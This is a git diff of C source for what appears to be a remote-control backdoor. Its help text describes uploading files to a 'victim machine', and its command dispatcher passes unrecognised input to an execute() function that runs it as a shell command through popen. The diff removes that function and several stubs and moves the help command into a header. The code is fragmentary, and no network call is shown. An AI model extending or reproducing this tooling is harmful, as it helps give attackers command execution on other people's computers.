@@ -1,16 +1,6 @@
 #include "struct.h"
 #include "communication.h"
-
-void help(char * command){
-    if(strcmp(command, "help") == 0){
-        printf("This command display information about other commands\n");
-        printf("Usage:\nhelp <command>");
-    }
-    else if(strcmp(command, "upload")){
-        printf("Upload command is used to send file to victim machine\n");
-        printf("Usage:\nupload <path/to/file>");
-    }
-}
+#include "commands.h"
 
 void connect(Conn connection){
     
@@ -26,14 +16,6 @@ void send_message(){
     }
 }
 
-
-void cd(char *path){
-
-}
-
-void upload(char *path){
-
-}
 
 void identifier(char * command){
 
@@ -53,6 +35,13 @@ void identifier(char * command){
         part = strtok(NULL, " ");
         upload(part);
 
+    }else if(strcmp(part, "help") == 0){
+        part = strtok(NULL, " ");
+        help(part);
+    
+    }else if(strcmp(command, "help") == 0){
+        help("default");
+
     }else if(strcmp(command, "exit") == 0){
         printf("Exiting...");
         exit(0);
@@ -61,25 +50,6 @@ void identifier(char * command){
         output = execute(command);
         printf("%s", output);
     }
-}
-
-char * execute(char * command){
-    FILE *fpipe;
-    char line[256];
-    char *output;
-    
-    output = (char *)malloc(sizeof(char) * 50000);
-    memset(output, 0, 50000);
-
-    if (!(fpipe = (FILE*)popen(command,"r"))){
-        error("Pipe error");
-    }
-
-    while ( fgets( line, 256, fpipe)){
-        strcat(output, line);
-    }
-    pclose(fpipe);
-    return output;
 }
 
 void error(char * er){
